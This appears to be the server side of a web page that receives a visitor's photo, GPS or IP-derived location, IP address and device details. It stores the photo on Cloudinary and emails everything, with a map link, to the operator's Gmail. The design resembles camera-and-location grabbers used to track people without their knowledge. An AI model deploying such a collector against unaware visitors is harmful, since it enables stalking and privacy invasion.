import cloudinary from "cloudinary";
import nodemailer from "nodemailer";
import fetch from "node-fetch"; // node 18+ has global fetch; keep for clarity if environment needs it

// Allow big base64 images
export const config = {
  api: {
    bodyParser: {
      sizeLimit: "15mb",
    },
  },
};

// Cloudinary setup
cloudinary.v2.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

async function getIpFromReq(req){
  const xff = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "";
  if (xff) return xff.split(",")[0].trim();
  if (req.socket && req.socket.remoteAddress) {
    return req.socket.remoteAddress.replace(/^.*:/, '');
  }
  return null;
}

async function ipToLatLng(ip){
  try {
    if (!ip) return null;
    // Use ipapi.co for quick IP geolocation
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!res.ok) return null;
    const j = await res.json();
    if (j && j.latitude && j.longitude) return `${j.latitude},${j.longitude}`;
    return null;
  } catch(e){ return null; }
}

export default async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ msg: "Only POST allowed" });

  try {
    const body = req.body || {};
    const {
      image,
      dateTime,
      deviceModel,
      browser,
      resolution,
      gpsLocation,
      ipLocation
    } = body;

    // Determine IP (server-side)
    const requestIp = await getIpFromReq(req);

    // Decide which location to use:
    // Priority: gpsLocation (frontend) → ipLocation (frontend) → server-side ip geolocation
    let usedLocation = null;
    let locationType = null;

    if (gpsLocation) {
      usedLocation = gpsLocation;
      locationType = "Google Location";
    } else if (ipLocation) {
      usedLocation = ipLocation;
      locationType = "IP Based Location";
    } else {
      // fallback: try server-side ip geolocation
      const latlng = await ipToLatLng(requestIp);
      if (latlng) {
        usedLocation = latlng;
        locationType = "IP Based Location";
      }
    }

    // Prepare image: if no image provided -> use transparent placeholder
    const finalImage = image && typeof image === "string" ? image : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";

    // Upload to Cloudinary
    const uploadRes = await cloudinary.v2.uploader.upload(finalImage, {
      folder: "user_photos",
      overwrite: false,
      resource_type: "image"
    });

    const photoURL = uploadRes.secure_url;

    // Compose email parts exactly as requested
    const usedDateTime = dateTime || (new Date()).toISOString().replace("T"," ").split(".")[0];
    const usedDevice = deviceModel || "Unknown Device";
    const usedBrowser = browser || (req.headers["user-agent"] || "Unknown Browser");
    const usedResolution = resolution || "Not Available";
    const usedIp = requestIp || "Not Available";
    const mapLink = usedLocation ? `https://www.google.com/maps?q=${usedLocation}` : "Not Available";

    // Setup nodemailer
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS
      }
    });

    // Send email with EXACT format requested
    const lines = [
      `New Photo Uploaded`,
      ``,
      `Date & Time: ${usedDateTime}`,
      `Device Model: ${usedDevice}`,
      `Browser: ${usedBrowser}`,
      `IP Address: ${usedIp}`,
      `Photo Resolution: ${usedResolution}`,
      ``,
      `${ usedLocation ? "Google Location: " : "IP Based Location: " }${ mapLink }`,
      ``,
      // View button (HTML)
    ];

    const htmlBody = `
      <div style="font-family: Arial, sans-serif; padding:20px; color:#222;">
        <div style="font-size:18px; font-weight:600; margin-bottom:8px;">New Photo Uploaded</div>
        <div style="font-size:14px; color:#333; line-height:1.6; margin-bottom:12px;">
          <div>Date & Time: ${usedDateTime}</div>
          <div>Device Model: ${usedDevice}</div>
          <div>Browser: ${usedBrowser}</div>
          <div>IP Address: ${usedIp}</div>
          <div>Photo Resolution: ${usedResolution}</div>
        </div>

        <div style="margin-top:6px; margin-bottom:14px;">
          <div style="font-size:14px; margin-bottom:6px;">
            ${ usedLocation ? "Google Location:" : "IP Based Location:" }
            <a href="${mapLink}" target="_blank" style="color:#007bff; text-decoration:none;"> ${mapLink}</a>
          </div>
        </div>

        <a href="${photoURL}" target="_blank" style="
            display:inline-block;
            background:#007bff;
            color:#fff;
            padding:10px 16px;
            border-radius:8px;
            text-decoration:none;
            font-size:15px;
        ">View Uploaded Photo</a>
      </div>
    `;

    await transporter.sendMail({
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: "New Photo Uploaded",
      html: htmlBody
    });

    return res.status(200).json({
      success: true,
      url: photoURL
    });

  } catch (err) {
    console.error("UPLOAD ERROR:", err);
    return res.status(500).json({ error: err.message || String(err) });
  }
}
